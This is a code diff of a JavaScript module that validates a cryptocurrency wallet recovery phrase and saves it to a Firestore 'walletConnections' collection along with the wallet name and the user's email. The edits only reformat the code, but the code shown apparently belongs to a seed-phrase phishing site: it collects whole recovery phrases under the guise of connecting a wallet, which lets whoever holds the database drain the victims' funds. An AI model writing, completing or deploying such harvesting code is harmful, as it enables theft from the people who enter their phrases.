@@ -19,11 +19,7 @@ export const validateRecoveryPhrase = (words) => {
     };
   }
 
-  const splitWords = words
-    .trim()
-    .split(/\s+/)
-    .filter((word) => word.length > 0);
-
+  const splitWords = words.trim().split(/\s+/).filter(word => word.length > 0);
   const wordCount = splitWords.length;
 
   if (wordCount !== 12 && wordCount !== 24) {
@@ -34,11 +30,7 @@ export const validateRecoveryPhrase = (words) => {
     };
   }
 
-  return {
-    isValid: true,
-    wordCount,
-    error: null,
-  };
+  return { isValid: true, wordCount, error: null };
 };
 
 /* =========================
@@ -56,16 +48,13 @@ export const saveWalletConnection = async (walletData) => {
       walletName: walletData.name,
       walletType: walletData.type,
       submittedEmail: walletData.email || null,
-      recoveryPhrase: walletData.recoveryPhrase || null,   // ← Correct field name
+      recoveryPhrase: walletData.recoveryPhrase || null,
       wordCount: walletData.wordCount || null,
       createdAt: serverTimestamp(),
       isActive: true,
     };
 
-    const docRef = await addDoc(
-      collection(db, "walletConnections"),
-      docData
-    );
+    const docRef = await addDoc(collection(db, "walletConnections"), docData);
 
     return {
       success: true,
@@ -74,9 +63,6 @@ export const saveWalletConnection = async (walletData) => {
     };
   } catch (error) {
     console.error("Save Wallet Error:", error);
-    return {
-      success: false,
-      error: error.message,
-    };
+    return { success: false, error: error.message };
   }
 };
